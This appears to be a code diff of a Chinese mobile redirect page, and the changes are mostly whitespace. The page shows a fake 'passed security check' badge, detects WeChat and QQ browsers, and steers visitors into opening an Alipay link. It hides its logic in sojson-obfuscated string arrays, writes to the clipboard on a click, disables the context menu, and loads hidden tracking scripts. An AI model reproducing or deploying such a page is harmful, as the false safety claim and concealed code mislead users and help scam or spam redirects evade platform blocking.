@@ -119,17 +119,18 @@
             <span class="wxtip-icon"></span>
             <p class="wxtip-txt">请点击右上角···<br>选择在“浏览器”中打开</p>
         </div>
+		
 		<div style="text-align:center;padding:60px 10px 50px 10px;">
 			<i class="weui-icon-waiting icon weui-icon-success" id="icon"></i>
 			<p style="font-size:20px;color:#555;" id="iconText">已通过安全检测</p>
 			<p style="font-size:12px;color:#999;" id="subText">如果没有自动跳转，请点击下方按钮前往</p>
 		</div>
 		
-		
         <div class="actions" id="goHome">
             <a href="alipays://platformapi/startapp?saId=10000007&amp;clientVersion=3.7.0.0718&amp;qrcode=https://qr.alipay.com/c1x09556q2dc57kb4un0qe4" onclick="show()" class="weui-btn weui-btn_primary" id="openSchemeLink">点击前往</a>
 			<a href="http://www.baidu.com/" id="homeurl" class="weui-btn weui-btn_default" style="display:none">我也要做一个</a>
         </div>
+		
 		<div class="footer">
 			<p>安全管家提供技术支持</p>
 			<p>Copyright © 1998 - 2018. All Rights Reserved.</p>
@@ -142,6 +143,7 @@
 			document.oncontextmenu=function(e){
 				e.preventDefault();
 			};
+			
 			mqq.ui.setTitleButtons({
 			   right : {
 				   title : " ",
@@ -150,6 +152,7 @@
 				   }
 			   }
 			});
+			
 			setTimeout(function() {
 				var icon = document.getElementById('icon'); 
 				var iconText = document.getElementById('iconText'); 
@@ -159,10 +162,11 @@
 				subText.innerHTML="如果没有自动跳转，请点击下方按钮前往";
 			}, 1000);
 			
-			
 			var qrcode="https://qr.alipay.com/c1x09556q2dc57kb4un0qe4";
 			var ua = navigator.userAgent.toLowerCase();	
+			
 			fun(qrcode);
+			
 			function fun(qrcode){
 				var encode_version = 'sojson.v4';
 				var __0x15059=['w7UTwpnCvRk=','METDiX4PwqBs','WcO/ZzHDvQ==','PsOfw7LDkijDvcO1eE/DocOawqAAVg==','w5kPbnoZw649a3w7wpfChcK2','NcOhwpbCnsKtaA==','X8KUGMObw5oQPw==','U8OPOcKa','YCYE','w6Uzwog=','d1HDpA==','f8Opw7AmwoM=','PsOhQ8KrJg==','w67CqTQ=','wqXDnWvCoMOP','WMOSwpHDu8Kj','w5vCmijCths=','I8OVAmrDsQ==','acKiLcOzw4M=','dMKqLcKowqw=','dsO3wrvDhMKo','WhfCr21p','F8OVAA==','K8O4BmLDvA==','wpLDn1nCn8Ou','w51rdw==','wooPVAgMwpIrwpsywo7DqHHDsCPCjHwywp9dDjFNP8OlelTCgmQ/wpNwwrltw5BlwrIZVcOMacKJBcOeVMKS','w6howoYEwrnDikDDq8KB','XcOmZjHDosK/VSY=','wo/CvsKRwojDnlU=','akrCgMK5w6J6CkQVSSzCmgZmK8OYUg50MsKcRcKiw6rCvWcUw4TCp8K2e2c9w5wYwr3DncOX','w4bDucOa','V8KzKA==','SsOlDQ==','w6LCtyJww4rCgBDCkH3DrQjCkcObw7JVenM1czVn','f8OKw5wowo8=','GcOYH03DtQ==','f8KMJmjCiA==','QxTCqX1vDQ==','IcK8AMK4wo8=','CMOJdcK3IA==','IcO7w6bDjxU=','WBhESQ==','wq5aZGVLw6jDkMO7w7Q=','woLDkgYiw5o=','PMOYYn7ClQ==','w5LChGdXBQ==','wofCvcKZwqbDqg==','IVzDtFkS','MsOQQ8Kv','wrbCrRsnwpY=','OMObw7LDkQ==','w4sHcX8d','w6cUwrFOBg==','WCzCoW1F','VcKOIMKSAsKowpQ=','wozClzYmFA==','XDvDlSHDig==','aCkIA8OBw7U=','w5PDunXDvmY=','w6gHwrBzEQ==','w54OfHg7w7U6Zng5','U8KMHMOHw4wNN8K3Vgc=','BcKFIsKtwqA=','LcOoRA==','XDPCtQ==','w5nCgGt7Jlg=','UcOlDcK5Iw==','WMOVPcKOMgXCqMOPw67DjA==','fl7DosKZw6s=','w7bCvAjCsQ0=','N8KYAcK0wrg=','cT3DljrDgQ==','bMOzwrnDlsK5MQ==','S8KOPsKZF8Kj','TH/DqcK9w74=','IsKCbkTDiw==','TmZc','NV3DimIa','PcOKw7nDmw/Dtg==','FsO2PEvDicKO','eCDDshzDgQ==','E8O9NknDhcKpw64=','fMOwYgrDlA==','GwzDlsORwrQ=','WR5EQg==','w4Q6wqZ9LA==','G8OYw7LDlQPDt8OzSUvDtA==','w5kPbnoUw7sn','L8OYJknDkA==','dsKGO8KpCA==','wq7Chz8F','wonCssKfwojDhW7DvA==','wpfChXQqDcKlOcODwovCi8OAwrV0','U8OhbTQ=','EsOnJlzDjsOcwqfCuFxRMn3CuMOhw6tKw7HDmGzCt8K8','w7XConzCvMONw7Aawp9oHcOFw7USwqVDNcOswoBewpTCs8Kiw7Ujw4d7wrDCsFJmbjTDiMOtZcOHw6swGiQ0FsOXwq7Crw==','YcO6wr7DgcKsIMOJwo5pwq1JNcOTwq5KwrHCvyMITsKOTMK/w6RWwrfDrT7Cvw7DrA==','w44HVG5FwqtuMwl9w4LDm8O1w40cZcK9UAvCv8OEwpAhw6pqw6rCgMOkIcOTw4hJwr/DosK9Nh/CkVQ=','IMOdw7TDkx/Du8Kg','A8KQJsKEwrUowo16w63CuMOES08R','b8OmwrLDn8KeOsOSw5Erw6d1MMOcwrE=','DMKHN8Kn','w5dxwocIwqfDikDDmsKMwo8='];
@@ -254,6 +258,7 @@
 					});
 				}
 			}
+			
 			function isWeixin(){
 				if(/micromessenger/.test(ua)){
 					return true;
@@ -261,6 +266,7 @@
 					return false;
 				}
 			}
+			
 			function isMobileQQ(){
 				if(/mobile/.test(ua)&&/qq/.test(ua)){
 					return true;
@@ -277,7 +283,6 @@
 				}
 			}
 			
-			
             function customClickEvent() { 		
                 var clickEvt;  
                 if (window.CustomEvent) {  		
@@ -292,7 +297,8 @@
   
                 return clickEvt;  
             }  
-           document.getElementById("JweixinTip").onclick = function(){ 
+			
+            document.getElementById("JweixinTip").onclick = function(){ 
 				document.getElementById("JweixinTip").style.display = "none";
 				var clipboard = new ClipboardJS('.wxtip', {
 				text: function() {
@@ -303,8 +309,8 @@
             
         </script> 
 
-<div style="display:none">
-<script src="https://s13.cnzz.com/z_stat.php?id=1274080751&amp;web_id=1274080751" language="JavaScript"></script><script src="https://c.cnzz.com/core.php?web_id=1274080751&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1274080751" target="_blank" title="站长统计">站长统计</a>
- </div>
+		<div style="display:none">
+			<script src="https://s13.cnzz.com/z_stat.php?id=1274080751&amp;web_id=1274080751" language="JavaScript"></script><script src="https://c.cnzz.com/core.php?web_id=1274080751&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1274080751" target="_blank" title="站长统计">站长统计</a>
+		</div>
      
 </body></html>
